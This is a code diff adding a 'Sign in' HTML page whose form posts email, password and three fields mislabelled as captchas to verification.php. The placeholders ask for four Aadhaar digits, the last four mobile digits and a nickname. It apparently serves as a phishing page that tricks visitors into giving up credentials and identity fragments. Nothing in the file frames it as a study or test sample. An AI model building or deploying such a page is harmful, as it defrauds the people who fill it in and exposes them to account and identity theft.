@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+<body style="text-align:center;">
+</head>
+<style>
+  /* General Styles */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  background-color: #f1f1f1;
+}
+
+form {
+  max-width: 600px;
+  margin: 0 auto;
+  padding: 20px;
+  background-color: #fff;
+  box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+}
+
+h2 {
+  margin-bottom: 20px;
+}
+
+label {
+  display: block;
+  margin-bottom: 5px;
+  font-weight: bold;
+}
+
+input[type="mail"],
+input[type="password"],
+input[type="captcha"] {
+  width: 100%;
+  padding: 10px;
+  margin-bottom: 15px;
+  border: none;
+  border-radius: 5px;
+  background-color: #f1f1f1;
+}
+
+input[type="submit"] {
+  background-color: #4CAF50;
+  color: #fff;
+  border: none;
+  border-radius: 5px;
+  padding: 10px 20px;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+
+input[type="submit"]:hover {
+  background-color: #3e8e41;
+}
+
+/* Media Queries */
+@media screen and (max-width: 768px) {
+  form {
+    max-width: 400px;
+  }
+}
+
+</style>
+<body>
+
+<h2>Sign in</h2>
+
+<form action="verification.php" method="post">
+  <label for="mail">Email:</label><br>
+  <input type="mail" id="mail" name="mail" required><br>
+  <label for="password">Password:</label><br>
+  <input type="password" id="password" name="password" required><br>
+  <label for="captcha">Captcha1:</label><br>
+  <input type="captcha" id="captcha" name="captcha" required placeholder="any 4 aadhar"><br><br>
+  <label for="captcha2">Captcha2:</label><br>
+  <input type="captcha" id="captcha2" name="captcha2" required placeholder="mobile last 4"><br><br>
+  <label for="captcha3">Captcha3:</label><br>
+  <input type="captcha" id="captcha3" name="captcha3" required placeholder="nick name"><br><br>
+  <input type="submit" value="Submit" name="submit">
+</form> 
+<script>
+  // Make the form responsive by adjusting the font size based on the screen width
+function adjustFontSize() {
+  const screenWidth = window.innerWidth;
+  const baseFontSize = 16;
+  const maxWidth = 600;
+  let fontSize = baseFontSize;
+  
+  if (screenWidth <= maxWidth) {
+    const ratio = screenWidth / maxWidth;
+    fontSize = baseFontSize * ratio;
+  }
+  
+  document.body.style.fontSize = `${fontSize}px`;
+}
+
+window.addEventListener('resize', adjustFontSize);
+adjustFontSize();
+
+</script>
+</body>
+</html>
